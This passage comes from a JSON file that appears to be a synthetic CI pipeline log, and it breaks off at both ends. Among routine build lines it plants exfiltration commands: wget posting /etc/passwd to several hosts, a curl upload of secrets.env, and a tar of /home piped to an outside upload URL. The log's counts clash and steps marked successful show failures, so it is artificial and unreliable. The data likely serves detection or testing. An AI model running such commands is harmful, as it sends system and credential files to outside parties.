https://example.com/collect -d @secrets.env\nDone.\nStep 5/20: Deploying\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: e2e/test_api_health.spec.js\nTests: 399 passed, 267 total\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\npip install: Successfully installed prettier-4.13\n[12:18:18] INFO: Cache refreshed\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nnpm notice: created a lockfile\nCoverage: 99% statements, 67% branches\nFAILED: test_auth_login\nInstalling prettier@1.16.6\n[12:18:18] DEBUG: Memory usage: 370MB\nCache restored successfully (39MB)\nStep 18/19: Linting\nSending 145MB of data to test.io\nCompiling src/main.py...\nStep 12/22: Installing dependencies\nSnapshots: 23 passed, 46 total\nCoverage: 86% statements, 88% branches\nGET /api - 200 (2ms)\nLoading...\npip install: Successfully installed eslint-1.9\nSending 40MB of data to test.io\nUsing Python 3.11\n[12:18:18] DEBUG: Initializing service\nStep 18/17: Testing\nCompiling lib/utils.go...\nSuccess!\nGenerating source maps...\nGET /status - 204 (80ms)\nSending 169MB of data to acme.corp\nGET /status - 201 (17ms)\nnpm notice: created a lockfile\npip: Downloading jest-1.12.tar.gz\nDone.\nGenerating source maps...\nDone.\nFetching submodules...\nWARNING: axios has known vulnerabilities\nStep 3/24: Installing dependencies\nyarn add: Done in 18.68s\nLoading...\nCache restored successfully (355MB)\nCache hit for key-3017\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nRan 114 tests in 59s\nnpm install: added 319 packages\nFinished.\nnpm notice: package.json updated\nFetching submodules...\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nFetching submodules...\npip: Collecting axios\n[12:18:18] DEBUG: Query executed in 87ms\nUploading artifact 'dist' (27 files)\nCreating production build...\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\n\u2713 Step 'build' succeeded\nCache hit for key-4452\nCache hit for key-2002\n=== Step save_cache completed ===",
    "steps": [
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-11T12:18:18.061302",
        "finished_at": "2025-12-11T12:18:25.121583",
        "log_lines": [
          "=== Step: setup_environment ===",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:18] INFO: Request completed",
          "Bundling runtime.js",
          "pip: Installing build dependencies...",
          "Uploading artifact 'build' (32 files)",
          "Step 15/25: Testing",
          "Step 1/20: Linting",
          "Compiling utils/main.py...",
          "\u2713 All checks passed",
          "[12:18:18] INFO: Request completed",
          "Transforming 406 files...",
          "Finished.",
          "\u2717 build failed with exit code 30",
          "Step 16/21: Testing",
          "Loading...",
          "Creating production build...",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Uploading artifact 'dist' (25 files)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling utils/main.py...",
          "Optimizing 91 modules...",
          "Compiling utils/service.java...",
          "[12:18:18] WARN: Deprecated API usage",
          "Already up to date.",
          "npm install: added 307 packages",
          "Test Suites: 28 passed, 31 total",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:18] INFO: Connecting to database",
          "Generating source maps...",
          "pip: Downloading jest-2.12.tar.gz",
          "Bundling main.js",
          "Step 20/17: Testing",
          "Transforming 800 files...",
          "Step 11/24: Building",
          "[12:18:18] INFO: Connecting to database",
          "Exception: ValueError",
          "Finished.",
          "Cache hit for key-3851",
          "POST /api - 202 (489ms)",
          "Using Node.js 14.15.4",
          "Creating production build...",
          "Ready.",
          "Artifact uploaded: dist.zip (34MB)",
          "Step 3/15: Installing dependencies",
          "WARNING: webpack has known vulnerabilities",
          "Cache miss for key-5611",
          "Loading...",
          "[12:18:18] WARN: Deprecated API usage",
          "Step 20/17: Linting",
          "WARNING: lodash has known vulnerabilities",
          "Already up to date.",
          "Artifact uploaded: dist.zip (11MB)",
          "Artifact downloaded: 22MB",
          "Minifying main.js",
          "Minifying app.js",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_user_create (24ms)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:18:18] WARN: Deprecated API usage",
          "Already up to date.",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "HEAD is now at 39563df",
          "[12:18:18] INFO: Cache refreshed",
          "Compiling utils/main.py...",
          "\u2713 package completed",
          "Compiling src/handler.rs...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-11T12:18:25.121583",
        "finished_at": "2025-12-11T12:18:32.181864",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Checking out develop branch",
          "Building Docker image...",
          "pip: Downloading eslint-1.18.tar.gz",
          "yarn add: Done in 14.14s",
          "pip install: Successfully installed eslint-1.11",
          "\u2713 build completed",
          "Exception: RuntimeError",
          "FAILED: test_db_connect",
          "Done.",
          "Creating production build...",
          "GET /api - 200 (3ms)",
          "pip: Downloading express-4.17.tar.gz",
          "Artifact downloaded: 10MB",
          "Compiling components/utils.go...",
          "Done.",
          "pip: Collecting prettier",
          "Done.",
          "Loading...",
          "[12:18:18] WARN: Deprecated API usage",
          "yarn add: Done in 8.22s",
          "Completed.",
          "Snapshots: 19 passed, 25 total",
          "yarn add: Done in 2.89s",
          "Tests: 439 passed, 83 total",
          "Ran 46 tests in 60s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Test Suites: 9 passed, 50 total",
          "Artifact downloaded: 48MB",
          "[12:18:18] DEBUG: Connection pool: 13 active",
          "Verifying...",
          "Cache hit for key-8248",
          "Fetching submodules...",
          "Layer 7/11: RUN command",
          "Ran 24 tests in 30s",
          "Compiling lib/index.js...",
          "Finished.",
          "npm notice: package.json updated",
          "Artifact downloaded: 29MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:18] INFO: Connecting to database",
          "Compiling lib/app.ts...",
          "Ran 61 tests in 24s",
          "Cache restored successfully (114MB)",
          "Time: 13.756s",
          "Building Docker image...",
          "[12:18:18] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "Snapshots: 39 passed, 40 total",
          "\u2713 Task completed in 1523ms",
          "Connecting to startup.dev:443...",
          "Compiling lib/utils.go...",
          "[12:18:18] INFO: Connecting to database",
          "Cache saved successfully",
          "FAILED: test_user_create",
          "[12:18:18] DEBUG: Loading configuration",
          "Cache saved successfully",
          "\u2713 test completed",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 187 tests in 6s",
          "Layer 6/13: ENV command",
          "\u2713 lint completed",
          "Coverage: 95% statements, 63% branches",
          "[12:18:18] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 15/15: Building",
          "Environment: staging",
          "Cache restored successfully (272MB)",
          "[12:18:18] INFO: Starting build process",
          "Checking out develop branch",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-11T12:18:32.181864",
        "finished_at": "2025-12-11T12:18:39.242145",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "[12:18:18] DEBUG: Query executed in 76ms",
          "[12:18:18] INFO: Cache refreshed",
          "[12:18:18] DEBUG: Initializing service",
          "npm install: added 63 packages",
          "[12:18:18] WARN: Deprecated API usage",
          "pip: Collecting react",
          "Compiling components/index.js...",
          "pip install: Successfully installed lodash-3.5",
          "[12:18:18] DEBUG: Query executed in 74ms",
          "Bundling runtime.js",
          "OK",
          "Image pulled successfully",
          "pip: Downloading webpack-3.4.tar.gz",
          "Waiting...",
          "[12:18:18] INFO: Processing request",
          "pip: Downloading axios-2.4.tar.gz",
          "[12:18:18] DEBUG: Connection pool: 10 active",
          "Uploading artifact 'build' (7 files)",
          "  PASS: integration/test_auth_login.spec.js",
          "Environment: staging",
          "  PASS: e2e/test_api_health.spec.js",
          "Artifact uploaded: dist.zip (41MB)",
          "Ran 89 tests in 19s",
          "Compiling src/app.ts...",
          "Transforming 257 files...",
          "GET /health - 201 (76ms)",
          "Snapshots: 8 passed, 50 total",
          "Artifact downloaded: 18MB",
          "[12:18:18] DEBUG: Query executed in 33ms",
          "[12:18:18] INFO: Cache refreshed",
          "OK",
          "Bundling styles.js",
          "\u2713 All checks passed",
          "\u2717 build failed with exit code 40",
          "Optimizing 20 modules...",
          "\u2713 Step 'setup' succeeded",
          "Checking out main branch",
          "npm install: resolved 125 packages",
          "Waiting...",
          "HEAD is now at 245cdbd",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: webpack has known vulnerabilities",
          "Compiling components/app.ts...",
          "Checking out master branch",
          "Coverage: 71% statements, 94% branches",
          "Already up to date.",
          "Connection established",
          "pip install: Successfully installed axios-4.16",
          "Cache restored successfully (477MB)",
          "Completed.",
          "  PASS: test_auth_login (312ms)",
          "Coverage: 71% statements, 77% branches",
          "OK",
          "HEAD is now at 4de5c45",
          "\u2713 build completed",
          "npm install: resolved 1928 packages",
          "Uploading artifact 'coverage' (49 files)",
          "Switched to branch 'feature/task-870'",
          "[12:18:18] INFO: Processing request",
          "Switched to branch 'hotfix/task-908'",
          "Using Node.js 20.11.6",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: resolved 1442 packages",
          "Cache invalidated: build",
          "GET /health - 201 (56ms)",
          "Connection established",
          "Image pulled successfully",
          "Tests: 295 passed, 55 total",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-11T12:18:39.242145",
        "finished_at": "2025-12-11T12:19:00.422989",
        "log_lines": [
          "=== Step: unit_tests ===",
          "\u2713 Step 'build' succeeded",
          "[12:18:18] INFO: Starting build process",
          "Using Python 3.9",
          "Done.",
          "Using Python 3.10",
          "[12:18:18] INFO: Starting build process",
          "[12:18:18] ERROR: Connection failed",
          "Cache restored successfully (149MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "WARNING: express has known vulnerabilities",
          "[12:18:18] DEBUG: Loading configuration",
          "Generating source maps...",
          "Done.",
          "Using Python 3.10",
          "GET /health - 201 (22ms)",
          "Connecting to startup.dev:443...",
          "npm install: resolved 1961 packages",
          "\u2713 Task completed in 2517ms",
          "Verifying...",
          "pip: Downloading express-3.2.tar.gz",
          "npm notice: package.json updated",
          "[12:18:18] INFO: Cache refreshed",
          "Creating production build...",
          "\u2713 All checks passed",
          "Using Python 3.11",
          "[12:18:18] ERROR: Connection failed",
          "Waiting...",
          "[12:18:18] INFO: Cache refreshed",
          "[12:18:18] DEBUG: Memory usage: 1491MB",
          "Step 14/22: Deploying",
          "Cache invalidated: build",
          "[12:18:18] INFO: Processing request",
          "[12:18:18] DEBUG: Memory usage: 699MB",
          "npm install: added 292 packages",
          "Compiling components/main.py...",
          "Compiling lib/app.ts...",
          "OK",
          "OK",
          "Loading...",
          "\u2717 build failed with exit code 67",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Collecting webpack",
          "Cache invalidated: node_modules",
          "\u2713 Step 'install' succeeded",
          "Tests: 463 passed, 120 total",
          "Compiling components/index.js...",
          "[12:18:18] INFO: Request completed",
          "Step 9/15: Installing dependencies",
          "Step 4/25: Building",
          "WARNING: prettier has known vulnerabilities",
          "Ran 75 tests in 19s",
          "FAILED: test_user_create",
          "npm install: resolved 814 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Downloading jest-5.5.tar.gz",
          "Time: 19.178s",
          "Platform: win32-x64",
          "POST /data - 201 (320ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache restored successfully (228MB)",
          "Checking out master branch",
          "Pushing to registry...",
          "pip: Downloading express-2.13.tar.gz",
          "npm install: added 401 packages",
          "Completed.",
          "[12:18:18] INFO: Request completed",
          "Step 17/18: Testing",
          "[12:18:18] DEBUG: Connection pool: 4 active",
          "Creating production build...",
          "\u2713 All checks passed",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-11T12:19:00.422989",
        "finished_at": "2025-12-11T12:19:03.247102",
        "log_lines": [
          "=== Step: checkout ===",
          "Connecting to cloud.services:443...",
          "Connecting to example.com:443...",
          "NODE_ENV=production",
          "WARNING: axios has known vulnerabilities",
          "npm notice: created a lockfile",
          "Loading...",
          "Ran 156 tests in 53s",
          "Cache miss for key-5431",
          "FAILED: test_auth_login",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "WARNING: express has known vulnerabilities",
          "[12:18:18] INFO: Starting build process",
          "Artifact uploaded: dist.zip (70MB)",
          "Compiling src/service.java...",
          "Processing...",
          "Cache hit for key-7673",
          "Coverage: 96% statements, 80% branches",
          "Compiling utils/utils.go...",
          "Step 18/24: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Snapshots: 34 passed, 25 total",
          "Ready.",
          "  PASS: e2e/test_auth_login.spec.js",
          "Tests: 343 passed, 93 total",
          "Cache restored successfully (362MB)",
          "\u2713 Task completed in 2874ms",
          "Generating source maps...",
          "Step 16/25: Testing",
          "Image pulled successfully",
          "Minifying app.js",
          "Already up to date.",
          "yarn add: Done in 27.14s",
          "[12:18:18] DEBUG: Query executed in 14ms",
          "[12:18:18] INFO: Starting build process",
          "Image pulled successfully",
          "Ready.",
          "Creating production build...",
          "Step 11/24: Running migrations",
          "Compiling lib/index.js...",
          "Tests: 66 passed, 493 total",
          "Step 13/17: Building",
          "OK",
          "HEAD is now at a044095",
          "[12:18:18] DEBUG: Query executed in 19ms",
          "Step 3/20: Installing dependencies",
          "OK",
          "Loading...",
          "Artifact downloaded: 39MB",
          "Compiling src/index.js...",
          "[12:18:18] INFO: Request completed",
          "pip: Downloading jest-5.3.tar.gz",
          "\u2717 build failed with exit code 88",
          "Success!",
          "[12:18:18] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "Creating production build...",
          "Building Docker image...",
          "Processing...",
          "[12:18:18] DEBUG: Query executed in 10ms",
          "Step 10/19: Running migrations",
          "Success!",
          "\u2713 Step 'build' succeeded",
          "Waiting...",
          "pip install: Successfully installed webpack-2.1",
          "Step 3/21: Deploying",
          "  PASS: e2e/test_user_create.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Generating source maps...",
          "Completed.",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-11T12:19:03.247102",
        "finished_at": "2025-12-11T12:19:24.427946",
        "log_lines": [
          "=== Step: build ===",
          "npm notice: package.json updated",
          "Optimizing 16 modules...",
          "Bundling main.js",
          "Installing jest@2.20.9",
          "[12:18:18] INFO: Processing request",
          "[12:18:18] INFO: Request completed",
          "WARNING: express has known vulnerabilities",
          "Finished.",
          "Compiling src/main.py...",
          "Cache hit for key-8304",
          "[12:18:18] INFO: Request completed",
          "Connecting to startup.dev:443...",
          "Pushing to registry...",
          "POST /api - 201 (161ms)",
          "Step 18/19: Running migrations",
          "Using Python 3.10",
          "Snapshots: 48 passed, 29 total",
          "npm notice: created a lockfile",
          "Coverage: 74% statements, 81% branches",
          "Compiling src/main.py...",
          "Compiling components/index.js...",
          "Compiling utils/utils.go...",
          "Using Python 3.10",
          "\u2713 lint completed",
          "[12:18:18] DEBUG: Connection pool: 10 active",
          "WARNING: express has known vulnerabilities",
          "Step 9/21: Linting",
          "\u2713 Step 'install' succeeded",
          "Completed.",
          "[12:18:18] INFO: Connecting to database",
          "[12:18:18] INFO: Connecting to database",
          "Connection established",
          "Exception: RuntimeError",
          "Step 14/23: Running migrations",
          "Uploading artifact 'build' (15 files)",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache miss for key-8942",
          "Success!",
          "Compiling utils/main.py...",
          "Fetching submodules...",
          "WARNING: express has known vulnerabilities",
          "Test Suites: 47 passed, 7 total",
          "Fetching submodules...",
          "Cache restored successfully (68MB)",
          "Compiling utils/app.ts...",
          "Processing...",
          "\u2713 Task completed in 3314ms",
          "[12:18:18] DEBUG: Connection pool: 1 active",
          "Snapshots: 42 passed, 20 total",
          "npm install: added 106 packages",
          "[12:18:18] DEBUG: Memory usage: 890MB",
          "OK",
          "\u2713 lint completed",
          "Optimizing 59 modules...",
          "GET /status - 200 (54ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 1/22: Testing",
          "[12:18:18] DEBUG: Initializing service",
          "Using Python 3.12",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Coverage: 80% statements, 79% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "NODE_ENV=production",
          "Pulling image: alpine:18",
          "[12:18:18] INFO: Request completed",
          "Verifying...",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: dist.zip (7MB)",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-11T12:19:24.427946",
        "finished_at": "2025-12-11T12:19:31.488227",
        "log_lines": [
          "=== Step: setup_node ===",
          "Pushing to registry...",
          "Step 9/17: Installing dependencies",
          "Step 6/25: Running migrations",
          "Coverage: 89% statements, 96% branches",
          "TLS handshake completed",
          "\u2713 Step 'checkout' succeeded",
          "Artifact downloaded: 14MB",
          "Connection established",
          "pip install: Successfully installed jest-5.19",
          "Uploading artifact 'dist' (23 files)",
          "Artifact downloaded: 50MB",
          "Fetching submodules...",
          "[12:18:18] INFO: Connecting to database",
          "Finished.",
          "Ran 11 tests in 45s",
          "pip install: Successfully installed jest-3.8",
          "[12:18:18] DEBUG: Initializing service",
          "Step 15/22: Running migrations",
          "Already up to date.",
          "WARNING: react has known vulnerabilities",
          "Cache saved successfully",
          "Platform: win32-x64",
          "Pushing to registry...",
          "Transforming 680 files...",
          "[12:18:18] INFO: Connecting to database",
          "Exception: TypeError",
          "Artifact uploaded: dist.zip (70MB)",
          "[12:18:18] DEBUG: Memory usage: 723MB",
          "[12:18:18] DEBUG: Connection pool: 10 active",
          "Coverage: 94% statements, 76% branches",
          "Cache miss for key-3195",
          "[12:18:18] DEBUG: Query executed in 37ms",
          "[12:18:18] DEBUG: Query executed in 32ms",
          "pip: Collecting lodash",
          "POST /api - 202 (252ms)",
          "Environment: production",
          "Connection established",
          "Cache invalidated: node_modules",
          "Artifact downloaded: 48MB",
          "Step 1/15: Testing",
          "Compiling components/handler.rs...",
          "pip: Downloading jest-5.16.tar.gz",
          "WARNING: jest has known vulnerabilities",
          "Already up to date.",
          "Already up to date.",
          "[12:18:18] INFO: Starting build process",
          "Compiling utils/handler.rs...",
          "Snapshots: 8 passed, 5 total",
          "Installing express@4.7.4",
          "[12:18:18] DEBUG: Connection pool: 18 active",
          "\u2713 validate completed",
          "[12:18:18] INFO: Connecting to database",
          "  PASS: e2e/test_auth_login.spec.js",
          "Processing...",
          "Bundling main.css",
          "NODE_ENV=test",
          "Uploading artifact 'build' (50 files)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 15/23: Testing",
          "Artifact uploaded: dist.zip (79MB)",
          "Optimizing 80 modules...",
          "Completed.",
          "Ran 63 tests in 14s",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Verifying...",
          "Uploading artifact 'build' (47 files)",
          "Uploading artifact 'coverage' (2 files)",
          "Compiling lib/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "NODE_ENV=test",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-11T12:19:31.488227",
        "finished_at": "2025-12-11T12:19:38.548508",
        "log_lines": [
          "=== Step: type_check ===",
          "Using Python 3.12",
          "WARNING: axios has known vulnerabilities",
          "  PASS: unit/test_api_health.spec.js",
          "Done.",
          "[12:18:18] DEBUG: Query executed in 77ms",
          "POST /upload - 202 (373ms)",
          "[12:18:18] WARN: Deprecated API usage",
          "[12:18:18] DEBUG: Connection pool: 9 active",
          "\u2713 Task completed in 4851ms",
          "Using Node.js 20.18.4",
          "Step 10/21: Deploying",
          "  PASS: test_api_health (298ms)",
          "WARNING: webpack has known vulnerabilities",
          "OK",
          "npm notice: created a lockfile",
          "[12:18:18] INFO: Processing request",
          "Building Docker image...",
          "Cache saved successfully",
          "Verifying...",
          "Compiling lib/app.ts...",
          "Processing...",
          "  PASS: e2e/test_api_health.spec.js",
          "Switched to branch 'bugfix/task-370'",
          "WARNING: react has known vulnerabilities",
          "[12:18:18] INFO: Connecting to database",
          "Test Suites: 44 passed, 40 total",
          "[12:18:18] WARN: Deprecated API usage",
          "npm install: resolved 1270 packages",
          "\u2713 test completed",
          "Bundling vendor.js",
          "Test Suites: 46 passed, 36 total",
          "pip: Installing build dependencies...",
          "Tests: 383 passed, 90 total",
          "[12:18:18] INFO: Request completed",
          "Exception: NullPointerException",
          "\u2713 Task completed in 4288ms",
          "Environment: test",
          "[12:18:18] INFO: Request completed",
          "NODE_ENV=production",
          "Generating source maps...",
          "Creating production build...",
          "Layer 1/9: RUN command",
          "Installing prettier@1.3.3",
          "Artifact uploaded: dist.zip (80MB)",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed react-1.9",
          "Compiling components/app.ts...",
          "Artifact downloaded: 20MB",
          "Artifact uploaded: dist.zip (98MB)",
          "Success!",
          "Compiling components/utils.go...",
          "Artifact uploaded: dist.zip (60MB)",
          "\u2713 Task completed in 691ms",
          "Step 16/23: Running migrations",
          "  PASS: test_db_connect (191ms)",
          "Connecting to test.io:443...",
          "Step 8/25: Building",
          "WARNING: axios has known vulnerabilities",
          "Waiting...",
          "Pulling image: node:3.11",
          "Fetching submodules...",
          "Time: 37.142s",
          "Step 3/17: Linting",
          "Pulling image: alpine:18",
          "Using Node.js 14.15.0",
          "Ran 154 tests in 21s",
          "pip: Installing build dependencies...",
          "Connecting to startup.dev:443...",
          "Step 5/23: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-11T12:19:38.548508",
        "finished_at": "2025-12-11T12:19:45.608789",
        "log_lines": [
          "=== Step: lint ===",
          "Done.",
          "Tests: 287 passed, 483 total",
          "[12:18:18] DEBUG: Connection pool: 19 active",
          "npm install: added 365 packages",
          "Exception: ValueError",
          "Loading...",
          "Cache saved successfully",
          "Step 3/25: Installing dependencies",
          "[12:18:18] DEBUG: Query executed in 80ms",
          "Done.",
          "yarn add: Done in 13.13s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing prettier@4.10.3",
          "npm notice: package.json updated",
          "Compiling src/service.java...",
          "Snapshots: 12 passed, 11 total",
          "[12:18:18] DEBUG: Initializing service",
          "[12:18:18] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (13MB)",
          "Step 4/25: Testing",
          "OK",
          "Fetching submodules...",
          "Step 7/20: Deploying",
          "Platform: darwin-arm64",
          "Compiling lib/app.ts...",
          "Tests: 294 passed, 277 total",
          "\u2713 All checks passed",
          "Step 10/24: Running migrations",
          "Cache restored successfully (390MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-9076",
          "Step 4/20: Testing",
          "Step 8/18: Deploying",
          "WARNING: express has known vulnerabilities",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (29MB)",
          "Snapshots: 13 passed, 37 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 All checks passed",
          "[12:18:18] INFO: Cache refreshed",
          "Waiting...",
          "OK",
          "npm notice: package.json updated",
          "pip install: Successfully installed lodash-2.4",
          "Platform: linux-x64",
          "[12:18:18] INFO: Connecting to database",
          "Generating source maps...",
          "Connecting to startup.dev:443...",
          "Tests: 342 passed, 323 total",
          "POST /data - 201 (374ms)",
          "Bundling main.js",
          "  PASS: test_auth_login (4ms)",
          "Compiling utils/main.py...",
          "  PASS: test_auth_login (69ms)",
          "Compiling utils/main.py...",
          "Artifact downloaded: 14MB",
          "Installing webpack@4.9.0",
          "npm notice: package.json updated",
          "[12:18:18] INFO: Request completed",
          "[12:18:18] DEBUG: Memory usage: 1379MB",
          "Minifying app.js",
          "[12:18:18] INFO: Processing request",
          "npm notice: package.json updated",
          "Transforming 675 files...",
          "[12:18:18] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:18] WARN: Deprecated API usage",
          "Cache hit for key-9489",
          "Cache restored successfully (433MB)",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-11T12:19:45.608789",
        "finished_at": "2025-12-11T12:19:48.432902",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Using Node.js 15.8.7",
          "Fetching submodules...",
          "Using Node.js 17.1.3",
          "npm notice: package.json updated",
          "Artifact downloaded: 20MB",
          "Step 2/20: Linting",
          "TLS handshake completed",
          "Optimizing 13 modules...",
          "Step 18/16: Running migrations",
          "Test Suites: 44 passed, 45 total",
          "Test Suites: 39 passed, 10 total",
          "Snapshots: 39 passed, 24 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying main.js",
          "Waiting...",
          "pip: Downloading axios-5.9.tar.gz",
          "\u2717 build failed with exit code 43",
          "yarn add: Done in 8.89s",
          "[12:18:18] INFO: Processing request",
          "[12:18:18] INFO: Starting build process",
          "Loading...",
          "NODE_ENV=production",
          "Cache saved successfully",
          "[12:18:18] DEBUG: Memory usage: 234MB",
          "[12:18:18] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "Step 8/20: Deploying",
          "Artifact downloaded: 12MB",
          "Done.",
          "yarn add: Done in 26.94s",
          "Cache saved successfully",
          "Cache hit for key-4864",
          "[12:18:18] DEBUG: Initializing service",
          "WARNING: lodash has known vulnerabilities",
          "Pushing to registry...",
          "[12:18:18] DEBUG: Initializing service",
          "\u2713 Step 'install' succeeded",
          "Optimizing 27 modules...",
          "pip: Installing build dependencies...",
          "Environment: development",
          "[12:18:18] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 84",
          "Connecting to cloud.services:443...",
          "pip: Installing build dependencies...",
          "Transforming 533 files...",
          "WARNING: eslint has known vulnerabilities",
          "[12:18:18] INFO: Connecting to database",
          "Step 3/21: Installing dependencies",
          "Success!",
          "Bundling styles.js",
          "[12:18:18] INFO: Cache refreshed",
          "Compiling utils/main.py...",
          "WARNING: prettier has known vulnerabilities",
          "Pushing to registry...",
          "OK",
          "Generating source maps...",
          "\u2717 build failed with exit code 41",
          "[12:18:18] INFO: Processing request",
          "Cache invalidated: dependencies",
          "[12:18:18] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:18] DEBUG: Memory usage: 290MB",
          "Step 8/19: Running migrations",
          "[12:18:18] INFO: Cache refreshed",
          "pip: Downloading eslint-2.20.tar.gz",
          "Cache hit for key-2697",
          "Completed.",
          "Step 4/21: Linting",
          "Creating production build...",
          "Processing...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-11T12:19:48.432902",
        "finished_at": "2025-12-11T12:19:55.493183",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "\u2717 build failed with exit code 38",
          "[12:18:18] DEBUG: Memory usage: 496MB",
          "Finished.",
          "Generating source maps...",
          "[12:18:18] INFO: Processing request",
          "Step 5/20: Building",
          "NODE_ENV=production",
          "POST /data - 200 (178ms)",
          "Step 16/19: Testing",
          "Switched to branch 'bugfix/task-409'",
          "npm notice: package.json updated",
          "Completed.",
          "Using Python 3.9",
          "Verifying...",
          "WARNING: eslint has known vulnerabilities",
          "yarn add: Done in 12.6s",
          "Bundling styles.css",
          "[12:18:18] ERROR: Connection failed",
          "Uploading artifact 'dist' (1 files)",
          "Artifact downloaded: 32MB",
          "Ran 28 tests in 25s",
          "[12:18:18] INFO: Processing request",
          "Artifact uploaded: dist.zip (51MB)",
          "Step 7/25: Building",
          "[12:18:18] INFO: Request completed",
          "[12:18:18] INFO: Request completed",
          "Bundling main.css",
          "Step 3/15: Building",
          "Tests: 368 passed, 97 total",
          "Success!",
          "[12:18:18] INFO: Cache refreshed",
          "POST /upload - 200 (25ms)",
          "Checking out develop branch",
          "[12:18:18] WARN: Deprecated API usage",
          "Connection established",
          "[12:18:18] DEBUG: Initializing service",
          "npm install: added 87 packages",
          "Minifying app.js",
          "yarn add: Done in 2.17s",
          "yarn add: Done in 26.81s",
          "Switched to branch 'hotfix/task-702'",
          "[12:18:18] INFO: Connecting to database",
          "HEAD is now at 96c908a",
          "Switched to branch 'feature/task-222'",
          "\u2713 test completed",
          "Step 4/22: Running migrations",
          "Bundling main.js",
          "  PASS: test_db_connect (460ms)",
          "Platform: win32-x64",
          "Processing...",
          "Platform: darwin-arm64",
          "Cache saved successfully",
          "Pulling image: python:latest",
          "npm install: added 471 packages",
          "Layer 5/13: COPY command",
          "Cache saved successfully",
          "Cache miss for key-9687",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Coverage: 95% statements, 80% branches",
          "[12:18:18] DEBUG: Loading configuration",
          "Step 12/16: Installing dependencies",
          "[12:18:18] WARN: Deprecated API usage",
          "Pushing to registry...",
          "FAILED: test_user_create",
          "Already up to date.",
          "[12:18:18] DEBUG: Connection pool: 4 active",
          "Coverage: 87% statements, 83% branches",
          "npm install: added 346 packages",
          "npm notice: created a lockfile",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
